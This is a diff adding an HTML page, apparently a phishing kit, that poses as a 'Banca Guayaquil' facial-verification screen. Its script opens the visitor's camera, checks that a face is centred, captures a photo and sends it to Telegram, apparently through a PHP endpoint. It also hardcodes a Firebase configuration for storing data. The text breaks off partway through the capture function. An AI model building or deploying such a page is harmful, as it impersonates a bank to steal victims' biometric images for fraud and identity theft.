@@ -1,0 +1,1456 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Banca Guayaquil - Verificación Facial</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+      import {
+        getFirestore,
+        doc,
+        setDoc,
+        onSnapshot,
+        serverTimestamp,
+      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+      const firebaseConfig = {
+        apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
+        authDomain: "basedtos-84767.firebaseapp.com",
+        projectId: "basedtos-84767",
+        storageBucket: "basedtos-84767.appspot.com",
+        messagingSenderId: "622608516389",
+        appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
+      };
+
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      window.db = db; // Hacer db accesible globalmente
+      window.doc = doc;
+      window.setDoc = setDoc;
+      window.serverTimestamp = serverTimestamp;
+      window.onSnapshot = onSnapshot;
+    </script>
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600;700&display=swap"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <style>
+      :root {
+        --default-color: #fff;
+        --primary-bg-color: #022675;
+        --secondary-bg-color: #160f41;
+        --text-color-default: #121212;
+        --text-color-terciary: #717171;
+        --text-color-link: #0f62fe;
+        --background-color-disabled: #ededed;
+        --background-gray: #f9f9f9;
+        --gray-200: #f3f3f3;
+        --gray-300: #e7e7ec;
+        --icon-color-variant: #898989;
+        --error-color: #da1e28;
+        --success-color: #198038;
+        --warning-color: #ff832b;
+      }
+
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family:
+          "Nunito Sans",
+          system-ui,
+          -apple-system,
+          BlinkMacSystemFont,
+          "Segoe UI",
+          Roboto,
+          Oxygen,
+          Ubuntu,
+          Cantarell,
+          "Open Sans",
+          "Helvetica Neue",
+          sans-serif;
+      }
+
+      html,
+      body {
+        height: 100%;
+        font-size: 16px;
+        color: var(--text-color-default);
+      }
+
+      body {
+        background-color: #ffffff;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        padding: 20px;
+      }
+
+      .container-login {
+        height: 100%;
+        position: relative;
+        display: grid;
+        place-items: center;
+        width: 100%;
+      }
+
+      .container-login .card {
+        width: 32rem;
+      }
+
+      @media (max-width: 767px) {
+        .container-login .card {
+          width: 100%;
+        }
+      }
+
+      @media (max-width: 400px) {
+        .container-login .card {
+          width: 100%;
+        }
+      }
+
+      .form-container {
+        box-shadow: #0000001a 0 4px 12px;
+        background-color: #fff;
+        border-radius: 1rem;
+        padding: 2rem;
+        justify-content: center;
+        align-items: center;
+      }
+
+      @media (min-width: 767px) {
+        .form-container {
+          grid-template-columns: 1fr;
+          max-width: 500px;
+          text-align-last: left;
+        }
+
+        .form-container .form {
+          width: 100%;
+          max-width: 500px;
+        }
+      }
+
+      .logo {
+        width: 100%;
+        margin-bottom: 1.25rem;
+        display: flex;
+        justify-content: center;
+      }
+
+      .logo img {
+        max-width: 200px;
+        height: auto;
+      }
+
+      .form {
+        margin-top: 2px;
+        width: 100%;
+      }
+
+      .title {
+        margin-bottom: 24px;
+      }
+
+      .title span {
+        width: 100%;
+        color: #121212;
+        font-size: 1.5em;
+        font-weight: 700;
+        word-wrap: break-word;
+        line-height: 1.4;
+      }
+
+      .subtitle {
+        color: var(--text-color-terciary);
+        font-size: 1em;
+        margin-top: 8px;
+        display: block;
+      }
+
+      /* Cámara y detección de rostro */
+      .camera-container {
+        position: relative;
+        width: 100%;
+        height: 300px;
+        margin-bottom: 1.5rem;
+        border-radius: 0.75rem;
+        overflow: hidden;
+        background-color: #000;
+        border: 2px solid var(--gray-300);
+      }
+
+      #video {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        transform: scaleX(-1);
+        position: absolute;
+        top: 0;
+        left: 0;
+      }
+
+      #canvas {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        z-index: 2;
+        pointer-events: none;
+      }
+
+      #detectionCanvas {
+        display: none;
+      }
+
+      .face-guide {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 180px;
+        height: 240px;
+        border: 3px solid rgba(17, 201, 185, 0.5);
+        border-radius: 10px;
+        background-color: transparent;
+        z-index: 1;
+        pointer-events: none;
+        box-shadow: 0 0 0 1000px rgba(0, 0, 0, 0.4);
+      }
+
+      .face-guide-text {
+        position: absolute;
+        bottom: -40px;
+        left: 0;
+        width: 100%;
+        text-align: center;
+        color: white;
+        font-weight: 600;
+        font-size: 0.9rem;
+        text-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
+        z-index: 3;
+      }
+
+      /* Indicadores de posición */
+      .position-indicators {
+        display: flex;
+        flex-direction: column;
+        gap: 0.75rem;
+        margin-bottom: 1.5rem;
+        background-color: var(--background-gray);
+        padding: 1rem;
+        border-radius: 0.75rem;
+      }
+
+      .position-item {
+        display: flex;
+        align-items: center;
+        gap: 0.75rem;
+      }
+
+      .position-item i {
+        font-size: 1.2rem;
+        width: 24px;
+        text-align: center;
+      }
+
+      .position-item i.fa-check-circle {
+        color: var(--success-color);
+      }
+
+      .position-item i.fa-times-circle {
+        color: var(--error-color);
+      }
+
+      .position-item i.fa-spinner {
+        color: var(--warning-color);
+      }
+
+      .position-text {
+        flex: 1;
+        font-weight: 600;
+        font-size: 0.9rem;
+      }
+
+      .position-status {
+        font-size: 0.85rem;
+        color: var(--text-color-terciary);
+      }
+
+      /* Contador */
+      .countdown {
+        text-align: center;
+        font-size: 1.5rem;
+        font-weight: 700;
+        color: var(--primary-bg-color);
+        margin-bottom: 1.5rem;
+        height: 40px;
+      }
+
+      /* Botón del CSS original */
+      .btn {
+        width: 100%;
+        padding: 0.75rem 1rem;
+        font-family: inherit;
+        font-size: 1rem;
+        border-radius: 0.75rem;
+        font-weight: 700;
+        border: none;
+        cursor: pointer;
+        background-color: var(--gray-200);
+        color: #000000b6;
+        transition: all 0.3s ease;
+        min-width: 0;
+        display: inline-flex;
+        justify-content: center;
+        align-items: center;
+        gap: 0.5rem;
+        margin-top: 8px;
+      }
+
+      .btn:disabled {
+        cursor: not-allowed;
+        color: var(--icon-color-variant);
+        background-color: var(--background-color-disabled);
+      }
+
+      .btn:active:enabled {
+        transform: scale(0.98);
+      }
+
+      .btnPrimary {
+        color: #fff;
+        background-color: var(--primary-bg-color);
+      }
+
+      .btnPrimary:disabled {
+        background-color: var(--background-color-disabled);
+      }
+
+      .btnPrimary:hover:not(:disabled) {
+        background-color: #04adb3;
+      }
+
+      .btnSecondary {
+        color: var(--text-color-default);
+        background-color: var(--gray-200);
+        border: 1px solid var(--gray-300);
+      }
+
+      .btnSecondary:hover:not(:disabled) {
+        background-color: var(--gray-300);
+      }
+
+      .btnSuccess {
+        color: white;
+        background-color: var(--success-color);
+      }
+
+      .btnSuccess:hover:not(:disabled) {
+        background-color: #146c2e;
+      }
+
+      /* Mensajes */
+      .message {
+        padding: 0.75rem;
+        border-radius: 0.5rem;
+        margin-bottom: 1.5rem;
+        font-size: 0.9rem;
+        display: none;
+      }
+
+      .message.active {
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+      }
+
+      .error-message {
+        background-color: #fff1f1;
+        border: 1px solid var(--error-color);
+        color: var(--error-color);
+      }
+
+      .success-message {
+        background-color: #f0f9f0;
+        border: 1px solid var(--success-color);
+        color: var(--success-color);
+      }
+
+      .warning-message {
+        background-color: #fff8f1;
+        border: 1px solid var(--warning-color);
+        color: #b35c00;
+      }
+
+      .info-message {
+        background-color: #f0f7ff;
+        border: 1px solid var(--text-color-link);
+        color: var(--text-color-link);
+      }
+
+      /* Instrucciones */
+      .instructions {
+        background-color: var(--background-gray);
+        border-radius: 0.75rem;
+        padding: 1.25rem;
+        margin-bottom: 1.5rem;
+      }
+
+      .instructions-title {
+        font-weight: 700;
+        margin-bottom: 0.75rem;
+        color: var(--secondary-bg-color);
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+      }
+
+      .instructions-list {
+        list-style-type: none;
+      }
+
+      .instructions-list li {
+        display: flex;
+        align-items: flex-start;
+        margin-bottom: 0.5rem;
+        font-size: 0.9rem;
+      }
+
+      .instructions-list li i {
+        color: var(--primary-bg-color);
+        margin-right: 0.75rem;
+        margin-top: 0.2rem;
+      }
+
+      /* Resultado */
+      .result-container {
+        text-align: center;
+        padding: 1rem 0;
+      }
+
+      .result-icon {
+        font-size: 3.5rem;
+        margin-bottom: 1rem;
+      }
+
+      .result-icon.success {
+        color: var(--success-color);
+      }
+
+      .result-icon.error {
+        color: var(--error-color);
+      }
+
+      .result-title {
+        font-size: 1.5rem;
+        font-weight: 700;
+        margin-bottom: 0.5rem;
+      }
+
+      .result-message {
+        color: var(--text-color-terciary);
+        margin-bottom: 1.5rem;
+        line-height: 1.6;
+      }
+
+      /* Botones en línea */
+      .button-group {
+        display: flex;
+        gap: 1rem;
+        margin-top: 1.5rem;
+        flex-wrap: wrap;
+      }
+
+      .button-group .btn {
+        flex: 1 1 0;
+        min-width: 0;
+      }
+
+      @media (max-width: 420px) {
+        .button-group {
+          flex-direction: column;
+        }
+        .button-group .btn {
+          width: 100%;
+        }
+      }
+
+      .container-login .card {
+        width: min(32rem, 100%);
+      }
+
+      .form-container {
+        width: 100%;
+      }
+
+      /* Estado de la cámara */
+      .camera-status {
+        text-align: center;
+        padding: 0.75rem;
+        background-color: var(--background-gray);
+        border-radius: 0.5rem;
+        margin-bottom: 1rem;
+        font-size: 0.9rem;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.5rem;
+      }
+
+      .camera-status i {
+        color: var(--primary-bg-color);
+      }
+
+      /* Animación de detección */
+      @keyframes pulse {
+        0% {
+          border-color: rgba(210, 0, 110, 0.5);
+        }
+        50% {
+          border-color: rgba(210, 0, 110, 0.9);
+        }
+        100% {
+          border-color: rgba(210, 0, 110, 0.5);
+        }
+      }
+
+      .face-guide.detecting {
+        animation: pulse 1.5s infinite;
+      }
+
+      .face-guide.centered {
+        border-color: var(--success-color);
+        box-shadow: 0 0 0 1000px rgba(25, 128, 56, 0.2);
+      }
+
+      /* Ocultar elementos */
+      .hidden {
+        display: none !important;
+      }
+
+      /* Vista previa de la foto capturada */
+      .photo-preview {
+        width: 100%;
+        height: 200px;
+        margin-bottom: 1.5rem;
+        border-radius: 0.75rem;
+        overflow: hidden;
+        border: 2px solid var(--gray-300);
+      }
+
+      .photo-preview img {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+      }
+
+      /* Mensaje de envío a Telegram */
+      .telegram-status {
+        background-color: #f0f9f0;
+        border: 1px solid #34b7f1;
+        color: #128c7e;
+        padding: 0.75rem;
+        border-radius: 0.5rem;
+        margin-bottom: 1.5rem;
+        font-size: 0.9rem;
+        display: none;
+        align-items: center;
+        gap: 0.5rem;
+      }
+
+      .telegram-status.active {
+        display: flex;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container-login">
+      <div class="card">
+        <div class="form-container">
+          <div class="logo" style="text-align: left !important">
+            <div style="display: flex; align-items: center; gap: 10px">
+              <img src="Logotipo_vertical_bi.png" alt="" />
+            </div>
+          </div>
+          <div class="form" id="verificationForm">
+            <!-- Título principal -->
+            <div class="title">
+              <span>Verificación Facial</span>
+              <div class="subtitle">
+                Por favor, coloca tu rostro dentro del marco para continuar
+              </div>
+            </div>
+
+            <!-- Mensajes -->
+            <div class="message error-message" id="errorMessage">
+              <i class="fas fa-exclamation-circle"></i> No se pudo acceder a la
+              cámara. Por favor, verifica los permisos.
+            </div>
+
+            <div class="message warning-message" id="warningMessage">
+              <i class="fas fa-exclamation-triangle"></i> No se detecta ningún
+              rostro. Por favor, colócate frente a la cámara.
+            </div>
+
+            <div class="message info-message active" id="infoMessage">
+              <i class="fas fa-info-circle"></i> Asegúrate de estar en un lugar
+              bien iluminado y quitar accesorios que cubran tu rostro.
+            </div>
+
+            <!-- Estado de envío a Telegram -->
+            <div class="telegram-status" id="telegramStatus">
+              <i class="fab fa-telegram"></i>
+              <span id="telegramStatusText">Enviando foto a Telegram...</span>
+            </div>
+
+            <!-- Contador para captura -->
+            <div class="countdown" id="countdown"></div>
+
+            <!-- Contenedor de cámara -->
+            <div class="camera-container">
+              <video id="video" autoplay playsinline></video>
+              <canvas id="canvas"></canvas>
+              <canvas id="detectionCanvas"></canvas>
+              <div class="face-guide" id="faceGuide">
+                <div class="face-guide-text" id="guideText">
+                  Coloca tu rostro aquí
+                </div>
+              </div>
+            </div>
+
+            <!-- Vista previa de foto capturada -->
+            <div class="photo-preview hidden" id="photoPreview">
+              <img id="capturedImage" src="" alt="Foto capturada" />
+            </div>
+
+            <!-- Estado de la cámara -->
+            <div class="camera-status" id="cameraStatus">
+              <i class="fas fa-video"></i>
+              <span id="statusText"
+                >Presiona "Activar Cámara" para comenzar</span
+              >
+            </div>
+
+            <!-- Indicadores de posición -->
+            <div class="position-indicators">
+              <div class="position-item" id="positionFace">
+                <i class="fas fa-spinner fa-spin"></i>
+                <div class="position-text">Rostro detectado</div>
+                <div class="position-status">Esperando...</div>
+              </div>
+              <div class="position-item" id="positionCenter">
+                <i class="fas fa-spinner"></i>
+                <div class="position-text">Rostro centrado</div>
+                <div class="position-status">Ajusta tu posición</div>
+              </div>
+            </div>
+
+            <!-- Instrucciones -->
+            <div class="instructions">
+              <div class="instructions-title">
+                <i class="fas fa-lightbulb"></i> Para una verificación exitosa:
+              </div>
+              <ul class="instructions-list">
+                <li>
+                  <i class="fas fa-check-circle"></i>
+                  <div>Asegúrate de que tu rostro esté bien iluminado</div>
+                </li>
+                <li>
+                  <i class="fas fa-check-circle"></i>
+                  <div>Mira directamente a la cámara</div>
+                </li>
+                <li>
+                  <i class="fas fa-check-circle"></i>
+                  <div>Mantén una expresión neutral</div>
+                </li>
+                <li>
+                  <i class="fas fa-check-circle"></i>
+                  <div>No uses gafas oscuras o gorras</div>
+                </li>
+              </ul>
+            </div>
+
+            <!-- Botones principales -->
+            <div id="initialControls">
+              <button class="btn btnPrimary" id="startCameraBtn">
+                <i class="fas fa-video"></i> Activar Cámara
+              </button>
+            </div>
+
+            <!-- Controles de cámara activa -->
+            <div id="cameraControls" class="hidden">
+              <div class="button-group">
+                <button class="btn btnSecondary" id="changeCameraBtn">
+                  <i class="fas fa-sync-alt"></i> Cambiar Cámara
+                </button>
+                <button class="btn btnPrimary" id="captureBtn" disabled>
+                  <i class="fas fa-camera"></i> Capturar Foto
+                </button>
+              </div>
+            </div>
+
+            <!-- Resultado de captura -->
+            <div id="captureResult" class="hidden">
+              <div class="result-container">
+                <i class="fas fa-check-circle result-icon success"></i>
+                <div class="result-title">¡Foto capturada exitosamente!</div>
+                <div class="result-message">
+                  Tu rostro ha sido verificado correctamente. Ahora puedes
+                  continuar.
+                </div>
+                <div class="button-group">
+                  <button class="btn btnSecondary" id="retryBtn">
+                    <i class="fas fa-redo"></i> Tomar otra foto
+                  </button>
+                  <button class="btn btnSuccess" id="continueBtn">
+                    <i class="fas fa-check"></i> Continuar
+                  </button>
+                </div>
+              </div>
+            </div>
+
+            <!-- Resultado de error -->
+            <div id="errorResult" class="hidden">
+              <div class="result-container">
+                <i class="fas fa-times-circle result-icon error"></i>
+                <div class="result-title" id="errorTitle">
+                  Error en la verificación
+                </div>
+                <div class="result-message" id="errorDetail">
+                  No se pudo completar la verificación facial.
+                </div>
+                <div class="button-group">
+                  <button class="btn btnSecondary" id="backBtn">
+                    <i class="fas fa-arrow-left"></i> Volver
+                  </button>
+                  <button class="btn btnPrimary" id="tryAgainBtn">
+                    <i class="fas fa-redo"></i> Intentar de nuevo
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Face-api.js para detección facial real -->
+    <script
+      defer
+      src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"
+    ></script>
+    <script>
+      document.addEventListener("DOMContentLoaded", async function () {
+        // Elementos del DOM
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const detectionCanvas = document.getElementById("detectionCanvas");
+        const capturedImage = document.getElementById("capturedImage");
+        const faceGuide = document.getElementById("faceGuide");
+        const guideText = document.getElementById("guideText");
+        const countdown = document.getElementById("countdown");
+        const photoPreview = document.getElementById("photoPreview");
+        const telegramStatus = document.getElementById("telegramStatus");
+        const telegramStatusText =
+          document.getElementById("telegramStatusText");
+
+        // Botones
+        const startCameraBtn = document.getElementById("startCameraBtn");
+        const changeCameraBtn = document.getElementById("changeCameraBtn");
+        const captureBtn = document.getElementById("captureBtn");
+        const retryBtn = document.getElementById("retryBtn");
+        const continueBtn = document.getElementById("continueBtn");
+        const backBtn = document.getElementById("backBtn");
+        const tryAgainBtn = document.getElementById("tryAgainBtn");
+
+        // Contenedores
+        const initialControls = document.getElementById("initialControls");
+        const cameraControls = document.getElementById("cameraControls");
+        const captureResult = document.getElementById("captureResult");
+        const errorResult = document.getElementById("errorResult");
+
+        // Indicadores de posición
+        const positionFace = document.getElementById("positionFace");
+        const positionCenter = document.getElementById("positionCenter");
+
+        // Mensajes
+        const errorMessage = document.getElementById("errorMessage");
+        const warningMessage = document.getElementById("warningMessage");
+        const infoMessage = document.getElementById("infoMessage");
+        const cameraStatus = document.getElementById("cameraStatus");
+        const statusText = document.getElementById("statusText");
+
+        // Variables de estado
+        let stream = null;
+        let currentFacingMode = "user";
+        let faceDetected = false;
+        let faceCentered = false;
+        let isCapturing = false;
+        let countdownInterval = null;
+        let capturedPhoto = null;
+        let detectionInterval = null;
+        let modelsLoaded = false;
+
+        // Dimensiones del video y canvas
+        let videoWidth = 0;
+        let videoHeight = 0;
+        let canvasContext = null;
+        let detectionContext = null;
+
+        // Cargar modelos de face-api.js
+        async function loadFaceDetectionModels() {
+          try {
+            const MODEL_URL =
+              "https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/";
+
+            statusText.textContent = "Cargando modelos de detección facial...";
+
+            await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
+            await faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL);
+
+            modelsLoaded = true;
+            console.log("✅ Modelos de detección facial cargados");
+            statusText.textContent = 'Presiona "Activar Cámara" para comenzar';
+          } catch (error) {
+            console.warn("⚠️ Error cargando modelos face-api.js:", error);
+            modelsLoaded = false;
+            statusText.textContent = "Usando detección simulada";
+          }
+        }
+
+        // Cargar modelos al inicio
+        if (typeof faceapi !== "undefined") {
+          await loadFaceDetectionModels();
+        } else {
+          console.warn(
+            "⚠️ face-api.js no disponible, usando detección simulada",
+          );
+          statusText.textContent = 'Presiona "Activar Cámara" para comenzar';
+        }
+
+        // Función para iniciar la cámara
+        async function startCamera(facingMode = "user") {
+          try {
+            // Detener stream actual si existe
+            if (stream) {
+              stream.getTracks().forEach((track) => track.stop());
+              clearInterval(detectionInterval);
+            }
+
+            // Solicitar acceso a la cámara
+            stream = await navigator.mediaDevices.getUserMedia({
+              video: {
+                facingMode: facingMode,
+                width: { ideal: 640 },
+                height: { ideal: 480 },
+              },
+            });
+
+            video.srcObject = stream;
+
+            // Esperar a que el video esté listo
+            await new Promise((resolve) => {
+              video.onloadedmetadata = () => {
+                resolve();
+              };
+            });
+
+            // Esperar a que el video realmente empiece a reproducirse
+            await video.play();
+
+            // Configurar dimensiones para ambos canvas
+            videoWidth = video.videoWidth;
+            videoHeight = video.videoHeight;
+
+            // Canvas visible - para dibujar indicadores
+            canvas.width = videoWidth;
+            canvas.height = videoHeight;
+            canvasContext = canvas.getContext("2d");
+
+            // Canvas oculto - para detección
+            detectionCanvas.width = videoWidth;
+            detectionCanvas.height = videoHeight;
+            detectionContext = detectionCanvas.getContext("2d");
+
+            console.log(`📹 Video iniciado: ${videoWidth}x${videoHeight}`);
+
+            // Mostrar controles de cámara
+            initialControls.classList.add("hidden");
+            cameraControls.classList.remove("hidden");
+            photoPreview.classList.add("hidden");
+            telegramStatus.classList.remove("active");
+            errorMessage.classList.remove("active");
+            infoMessage.classList.add("active");
+            statusText.textContent = "Cámara activa - Buscando rostro...";
+
+            // Actualizar estado
+            currentFacingMode = facingMode;
+
+            // Iniciar detección de rostros
+            startFaceDetection();
+          } catch (error) {
+            console.error("❌ Error al acceder a la cámara:", error);
+            errorMessage.classList.add("active");
+            infoMessage.classList.remove("active");
+            statusText.textContent = "Error al acceder a la cámara";
+            showErrorResult(
+              "No se pudo acceder a la cámara",
+              "Verifica que la cámara esté conectada y tengas los permisos necesarios.",
+            );
+          }
+        }
+
+        // Iniciar detección de rostros
+        function startFaceDetection() {
+          if (detectionInterval) {
+            clearInterval(detectionInterval);
+          }
+
+          // Detección más frecuente para mejor respuesta
+          detectionInterval = setInterval(detectFaces, 150);
+        }
+
+        // Detectar rostros en el video
+        async function detectFaces() {
+          if (isCapturing || !video.readyState === 4) return;
+
+          try {
+            // Limpiar canvas visible
+            canvasContext.clearRect(0, 0, videoWidth, videoHeight);
+
+            // Dibujar video en el canvas OCULTO para detección (sin invertir)
+            detectionContext.drawImage(video, 0, 0, videoWidth, videoHeight);
+
+            if (modelsLoaded && typeof faceapi !== "undefined") {
+              // Usar face-api.js para detección real en el canvas oculto
+              const detections = await faceapi
+                .detectAllFaces(
+                  detectionCanvas,
+                  new faceapi.TinyFaceDetectorOptions({
+                    inputSize: 224,
+                    scoreThreshold: 0.5,
+                  }),
+                )
+                .withFaceLandmarks();
+
+              processFaceDetection(detections);
+            } else {
+              // Usar detección simulada mejorada
+              simulateFaceDetection();
+            }
+          } catch (error) {
+            console.warn("⚠️ Error en detección:", error);
+            simulateFaceDetection();
+          }
+        }
+
+        // Procesar resultados de detección real
+        function processFaceDetection(detections) {
+          // Limpiar canvas visible
+          canvasContext.clearRect(0, 0, videoWidth, videoHeight);
+
+          if (detections && detections.length > 0) {
+            const detection = detections[0];
+            const box = detection.detection.box;
+
+            // Calcular centro del rostro
+            const faceCenterX = box.x + box.width / 2;
+            const faceCenterY = box.y + box.height / 2;
+            const faceWidth = box.width;
+            const faceHeight = box.height;
+
+            // Dibujar indicador del rostro detectado en canvas VISIBLE
+            canvasContext.strokeStyle = faceCentered ? "#00FF00" : "#FF6B00";
+            canvasContext.lineWidth = 3;
+            canvasContext.strokeRect(box.x, box.y, box.width, box.height);
+
+            // Actualizar indicadores
+            updatePositionIndicators(
+              faceCenterX,
+              faceCenterY,
+              faceWidth,
+              faceHeight,
+            );
+          } else {
+            handleNoFaceDetected();
+          }
+        }
+
+        // Simular detección de rostros mejorada
+        let simulationState = {
+          hasFace: false,
+          x: videoWidth / 2,
+          y: videoHeight / 2,
+          width: 160,
+          height: 220,
+          targetX: videoWidth / 2,
+          targetY: videoHeight / 2,
+          frameCount: 0,
+        };
+
+        function simulateFaceDetection() {
+          simulationState.frameCount++;
+
+          // Limpiar canvas visible
+          canvasContext.clearRect(0, 0, videoWidth, videoHeight);
+
+          // Simular presencia de rostro de manera más estable
+          if (simulationState.frameCount % 50 === 0) {
+            simulationState.hasFace = Math.random() > 0.15; // 85% de probabilidad
+
+            if (simulationState.hasFace) {
+              // Generar nueva posición objetivo
+              simulationState.targetX =
+                videoWidth / 2 + (Math.random() * 80 - 40);
+              simulationState.targetY =
+                videoHeight / 2 + (Math.random() * 60 - 30);
+            }
+          }
+
+          if (simulationState.hasFace) {
+            // Movimiento suave hacia el objetivo
+            simulationState.x +=
+              (simulationState.targetX - simulationState.x) * 0.1;
+            simulationState.y +=
+              (simulationState.targetY - simulationState.y) * 0.1;
+
+            // Variación sutil en el tamaño
+            const sizeVariation =
+              Math.sin(simulationState.frameCount * 0.05) * 10;
+            const currentWidth = 180 + sizeVariation;
+            const currentHeight = 240 + sizeVariation;
+
+            // Dibujar cuadro del rostro en canvas VISIBLE
+            const left = simulationState.x - currentWidth / 2;
+            const top = simulationState.y - currentHeight / 2;
+
+            canvasContext.strokeStyle = faceCentered ? "#00FF00" : "#FF6B00";
+            canvasContext.lineWidth = 3;
+            canvasContext.strokeRect(left, top, currentWidth, currentHeight);
+
+            // Actualizar indicadores
+            updatePositionIndicators(
+              simulationState.x,
+              simulationState.y,
+              currentWidth,
+              currentHeight,
+            );
+          } else {
+            handleNoFaceDetected();
+          }
+        }
+
+        // Manejar cuando no se detecta rostro
+        function handleNoFaceDetected() {
+          faceDetected = false;
+          faceCentered = false;
+
+          updatePositionIndicators(null, null, null, null);
+
+          faceGuide.classList.remove("centered", "detecting");
+          guideText.textContent = "Coloca tu rostro aquí";
+          guideText.style.color = "#ffffff";
+          captureBtn.disabled = true;
+
+          warningMessage.classList.add("active");
+        }
+
+        // Actualizar indicadores de posición
+        function updatePositionIndicators(centerX, centerY, width, height) {
+          const guideCenterX = videoWidth / 2;
+          const guideCenterY = videoHeight / 2;
+
+          if (
+            centerX !== null &&
+            centerY !== null &&
+            width !== null &&
+            height !== null
+          ) {
+            // Calcular distancias
+            const distanceFromCenterX = Math.abs(centerX - guideCenterX);
+            const distanceFromCenterY = Math.abs(centerY - guideCenterY);
+
+            // Actualizar estado
+            faceDetected = true;
+            faceCentered = distanceFromCenterX < 40 && distanceFromCenterY < 50;
+
+            // Actualizar indicadores visuales
+            if (faceCentered) {
+              faceGuide.classList.add("centered");
+              faceGuide.classList.remove("detecting");
+              guideText.textContent = "¡Perfecto!";
+              guideText.style.color = "#198038";
+
+              if (!isCapturing) {
+                captureBtn.disabled = false;
+              }
+            } else {
+              faceGuide.classList.remove("centered");
+              faceGuide.classList.add("detecting");
+              guideText.textContent = "Centra tu rostro";
+              guideText.style.color = "#ffffff";
+              captureBtn.disabled = true;
+            }
+
+            // Actualizar indicadores de texto
+            positionFace.innerHTML =
+              '<i class="fas fa-check-circle"></i><div class="position-text">Rostro detectado</div><div class="position-status">Correcto</div>';
+            positionFace.querySelector("i").style.color = "#198038";
+
+            if (faceCentered) {
+              positionCenter.innerHTML =
+                '<i class="fas fa-check-circle"></i><div class="position-text">Rostro centrado</div><div class="position-status">Correcto</div>';
+              positionCenter.querySelector("i").style.color = "#198038";
+            } else {
+              positionCenter.innerHTML =
+                '<i class="fas fa-exclamation-circle"></i><div class="position-text">Rostro centrado</div><div class="position-status">Ajusta tu posición</div>';
+              positionCenter.querySelector("i").style.color = "#ff832b";
+            }
+
+            warningMessage.classList.remove("active");
+          } else {
+            // Resetear indicadores
+            positionFace.innerHTML =
+              '<i class="fas fa-times-circle"></i><div class="position-text">Rostro detectado</div><div class="position-status">No detectado</div>';
+            positionFace.querySelector("i").style.color = "#da1e28";
+
+            positionCenter.innerHTML =
+              '<i class="fas fa-spinner"></i><div class="position-text">Rostro centrado</div><div class="position-status">Esperando...</div>';
+            positionCenter.querySelector("i").style.color = "#898989";
+          }
+        }
+
+        // Iniciar cuenta regresiva para captura
+        function startCountdown() {
+          if (!faceDetected || !faceCentered) {
+            alert(
+              "Por favor, coloca tu rostro correctamente dentro del marco antes de capturar.",
+            );
+            return;
+          }
+
+          isCapturing = true;
+          captureBtn.disabled = true;
+          let count = 3;
+
+          countdown.textContent = `Capturando en ${count}...`;
+
+          countdownInterval = setInterval(() => {
+            count--;
+            if (count > 0) {
+              countdown.textContent = `Capturando en ${count}...`;
+            } else {
+              clearInterval(countdownInterval);
+              countdown.textContent = "¡Sonríe! 📸";
+              setTimeout(capturePhoto, 500);
+            }
+          }, 1000);
+        }
+
+        // Capturar foto CORREGIDO
+        async function capturePhoto() {
+          try {
+            // Crear canvas temporal para la captura
+            const captureCanvas = document.createElement("canvas");
+            captureCanvas.width = videoWidth;
+            captureCanvas.height = videoHeight;
+            const captureCtx = captureCanvas.getContext("2d");
+
+            // IMPORTANTE: Dibujar el video directamente (sin transformaciones)
+            captureCtx.save();
+            captureCtx.scale(-1, 1);
+            captureCtx.drawImage(
+              video,
+              -videoWidth,
+              0,
+              videoWidth,
+              videoHeight,
+            );
+            captureCtx.restore();
+
+            // Obtener imagen en base64
+            capturedPhoto = captureCanvas.toDataURL("image/jpeg", 0.92);
+
+            console.log(
+              "📸 Foto capturada:",
+              capturedPhoto.substring(0, 50) + "...",
+            );
+
+            // Mostrar estado de envío a Telegram
+            telegramStatus.classList.add("active");
+            telegramStatusText.textContent = "Enviando foto a Telegram...";
+
+            // Enviar foto a Telegram via PHP
+            await sendPhotoToTelegram(capturedPhoto);
+
+            // 1. Ocultar elementos de cámara
+            const cameraContainer = document.querySelector(".camera-container");
+
+            // Ocultar video, canvas y guía
+            video.style.display = "none";
+            canvas.style.display = "none";
+            faceGuide.style.display = "none";
+
+            // Cambiar fondo del contenedor a blanco
+            cameraContainer.style.backgroundColor = "#ffffff";
+            cameraContainer.style.border = "2px solid var(--gray-300)";
+
+            // 2. Mostrar foto en el contenedor de cámara
+            const previewImg = document.createElement("img");
+            previewImg.id = "fullSizePreview";
+            previewImg.src = capturedPhoto;
+            previewImg.style.cssText = `
+              width: 100%;
+              height: 100%;
+              object-fit: contain;
+              display: block;
+            `;
+
+            // Limpiar contenedor y agregar la foto
+            cameraContainer.innerHTML = "";
+            cameraContainer.appendChild(previewImg);
+
+            // 3. Ocultar indicadores de posición
+            document.querySelector(".position-indicators").style.display =
+              "none";
+
+            // 4. Actualizar estado de Telegram
+            telegramStatusText.textContent = "✅ Foto Procesada";
+            telegramStatus.classList.remove("telegram-status");
